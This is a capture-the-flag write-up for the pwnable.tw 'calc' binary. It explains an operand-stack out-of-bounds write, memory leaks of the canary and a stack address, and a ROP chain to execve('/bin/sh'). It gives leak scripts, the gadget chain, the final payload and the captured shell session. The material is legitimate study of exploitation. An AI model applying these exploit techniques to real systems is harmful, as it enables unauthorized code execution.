# calc

rop2syscall, Array OOB, Leaking stack addr

## checksec

```bash
[*] '/mnt/d/CTFs/pwnable-tw/calc/calc'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

There is no PIE, so the ROP gadget addresses are fixed. Also, the binary is statically linked, so we can go ROP gadget shopping pretty easily within the binary. 

## General Functionality / Structure of the Binary

The binary evaluates arithmetic expressions by first, in the `get_expr` function, filtering out all characters which are not digits or `+`, `-`, `*`, `/` or `%`. Then, it maintains an operator stack (of characters) as well as an operand stack (of integers) while parsing the filtered input in order to ensure that `*`, `/` and `%` are evaluated before `+` and `-`. We illustrate a few examples of the arithmetic it performs below

```
=== Welcome to SECPROG calculator ===
1+1
2
1+2*2-3/3     
4
1+1*1+1*1+1*1+
expression error!
```

### Stack Frame of the `calc` function

The stack frame of the `calc` function is as follows

```
             +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
             |             Return address (4 bytes)                          |
  ebp+0x4 -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
             .             Other stuff                                       .
             +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
             |             Stack canary (4 bytes)                            |
  ebp-0xc -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
             |                                                               .
             .             Filtered input buffer (0x400 bytes, chars)        .
             .                                                               .
             .                                                               |
ebp-0x40c -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
             |                                                               .
             .             Operand Stack (0x1a0 bytes, ints)                 .
             .                                                               |
ebp-0x5a0 -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

Importantly, whenever a `+` or `-` operation is followed by a `*`, `/` or `%` operation and then followed by any other operation, the first operand of the first `+` or `-` operation will be left on the operand stack (the operands won't all live on the operand stack at the same time because during parsing, the binary also evaluates the expression on the fly). 

This allows us to build up the operand stack and therefore overwrite a contiguous segment of memory. 

An expression like

```
1+1*1+1*1+1*1
```

would result in an operand stack of size 5 (at its largest), filled with 4-byte 1s. 

The 1's would all be left on the operand stack before the collapsing of the operator stack (which would be filled with +'s) would ultimately result in the stack being, from bottom to top, `5, 4, 3, 2, 1`. This is generally not what we want as it would require some amount of reverse engineering to know what integers to inject to get the numbers we want. 

Thankfully, to instead leave our original integers on the stack as artifacts, we can simply add a plus to the end of the expression, which causes an error such that the operator stack will not be evaluated back down to being empty (and thus leaving our 1's on the operator stack as 1's)

```
1+1*1+1*1+1*1+
```

## Actualizing the Array Out-of-Bounds

First, we might think of writing in `0x400` characters as integers. We would need `0x5a4 / 4 = 361 = 0x16c` integers to reach the return address of the `calc` function. Notice that this method of reaching the retaddr of `calc` is not feasible because: 

1. Other than the first operand, to continuously grow the operand stack by the dummy integer "1" requires 4 characters in the input payload per element. This is insufficient because `0x16b * 0x4` is more than the number of chars we can write in for one payload. 
2. We would want to write more complex integers in that are more than 1 digit in length, requiring even more characters. 
3. This would smash the stack of `parse_expr` because this adds a large number of `+` to the operator stack that lives in the stack frame of `parse_expr`. If we are overwriting the retaddr of `calc`, we need `parse_expr` to return properly. 

Instead, first understand that the operand stack has its size as the first element in the integer array that implements it. 

Also, if the operand is 0, it is not added to the stack (see the decompiled code below, which is from Binary Ninja with some variables renamed)

> `eax_26` is just the number between any 2 arithmetic operators, which means that we can't conventionally represent negative numbers in this calculator executable since the negaitve sign will be considered an operator and instead `eax_26` will be its absolute val

```c
08049136                  int32_t eax_26 = atoi(var_7c_1)
08049142                  if (eax_26 s> 0)
0804914a                      int32_t eax_28 = *operand_stack
08049155                      *operand_stack = eax_28 + 1
08049160                      operand_stack[eax_28 + 1] = eax_26
```

while the `eval` function (that runs after the above lines run, if the expression is evaluated on-the-fly during parsing such as for the expression `1+1+1+1`) still reduces the size of the operand stack. 

This means that if we get the binary to evaluate `x+0` at the start of our arithmetic expression, where `x` is some positive integer, the evaluation will result in the size variable of the operand stack being `x`. Then next operand pushed onto the stack will then be into the `x+1`-th position. 

We can then use the technique described in [Stack Frame of the `calc` function](#stack-frame-of-the-calc-function) to incrementally write values to wherever `operand_stack + size` is pointing to. 

> NOTE: We need to use "00" instead of "0" because a strcmp is done with number strings within the input for "0", and if detected `parse_expr` prints "prevent division by zero" and returns without further parsing

### Injecting the ROP Chain

We use the following ROP chain to rop2syscall (creaation mostly automated using pwntools)

```
0x0000:        0x80701d0 pop edx; pop ecx; pop ebx; ret
0x0004:              0x0
0x0008:              0x0
0x000c:       0xff892078
0x0010:        0x805c34b pop eax; ret
0x0014:              0xb
0x0018:        0x8049a21 int 0x80
0x001c:       0x6e69622f
0x0020:         0x68732f
```

which makes the `execve('/bin/sh\x00, 0, 0)` syscall. Notably, the `0xff892078` is the address of `0x6e6922f`, which is the start of the `/bin/sh\x00` string. We are able to leak the address of the stack because we have [arb-read capability](#arb-read-capability). 

To slot all of these on the stack as integers by exploiting the operand stack, we have a few cases to consider that extends the technique in [Stack Frame of the `calc` function](#stack-frame-of-the-calc-function)

1. If the value `x` to be injected is positive when treated as an int32_t, then we exploit the operand stack to inject it using `x*1+`. 
2. If the value to be injected `x` is negative when treated as an int32_t, then we must leverage the multiplication of 2 numbers to get the negative int32_t, which is just a large uint32_t. This is because the `atoi()` call in the binary does not register negative int32_t's i.e. the value is capped at `0x7fffffff`. For example, to inject `0x80000000`, we would use `0x40000000*2+` instead of `0x80000000*1+` (hex representation is used here just for illustration, in reality it would be in decimal representation). 
3. If the value to be injected is equal to 0, we cannot use `0*1+` or `00*1+` since 0 is never pushed onto operand stack. Instead, we need to use `1*1-1+` to both bypass this and also ensure that, if chaining them together, the operands are not collapsed into one another by the on-the-fly expression evaluation that occurs during parsing (which would be the case if we used `1-1+`). 

## Arb-read capability

If we do not provide one of the 2 arguments to the first arithmetic clause in the expression, or have it be zero, then when evaluating, there will be an overwriting of the int32_t just before the operand stack data. This is coincidentally the size field of the operand stack, and the method described is exactly how we overwrote the size field of the operand stack as described in [Actualizing the Array Out-of-bounds](#actualizing-the-array-out-of-bounds). 

We can actually use this to leak any piece of memory in the vaddr space of the process because the binary uses the overwritten size field as an offset from the operand stack data addr to deference and print an integer (decompiled code below is again from Binary Ninja, with renames)

> `data_80bf804` is  "%d\n"

```c
08049406              void operand_stack_data
08049406              int32_t var_5b8_2 = *(&operand_stack_data + ((operand_stack_size - 1) << 2))
08049411              _IO_printf(&data_80bf804)
0804941e              _IO_fflush(_IO_stdout)
```

The way the binary works is also nicely setup such that if we run get it to evaluate `+x`, it prints the int32_t at `ebp-0x5a0+x*0x4`. 

Thus, for example, we can leak the canary of the stack frame of the `calc` function with the following script

```python
# Leak canary of the stack frame of `calc`
r.sendlineafter(b'===\n', b'+357')
canary = int(r.recvline().strip()) & 0xFFFFFFFF # Convert neg number to uint32_t
log.info(f"{hex(canary)=}")
```

Note that as shown in the sections above and the [solve script](./solve.py), we do not need to use this arb-read capability since we have arb-write capability to one contiguous memory segment per iteration of the while loop in `calc`, as described in [Actualizing the Array Out-of-bounds](#actualizing-the-array-out-of-bounds), which allows us to bypass overwriting the canary. 

### Leaking the Stack Address of our `/bin/sh\x00` string

The address of the filtered user input is pushed to the position -6*4 bytes from the operand stack, so we can leak it using the following code

```python
# Leak stack addr of where we inject the /bin/sh\x00 string
r.sendlineafter(b'===\n', b'-6')
binsh_addr = (int(r.recvline().strip()) & 0xFFFFFFFF) + 0x410 + 28 # Convert neg number to uint32_t and add fixed offset
log.info(f"{hex(binsh_addr)=}")
```

Adding 0x410 gets us to the retaddr of `calc`, and 28 is the length of our ROP chain before the `/bin/sh\x00` string. 

## Flag

```bash
[+] Opening connection to chall.pwnable.tw on port 10100: Done
[*] hex(binsh_addr)='0xff91a238'
[*] Loaded 89 cached gadgets for './calc'
b'\xd0\x01\x07\x08\x00\x00\x00\x00\x00\x00\x00\x008\xa2\x91\xffK\xc3\x05\x08\x0b\x00\x00\x00!\x9a\x04\x08/bin/sh\x00'
[*] payload=b'360+00+134676944*1+1*1-1+1*1-1+2143867164*2+134595403*1+11*1+134519329*1+1852400175*1+6845231*1+'
[*] Switching to interactive mode
expression error!
$ cd home/calc
$ ls
calc
flag
run.sh
$ cat flag
FLAG{C:\Windows\System32\calc.exe}
```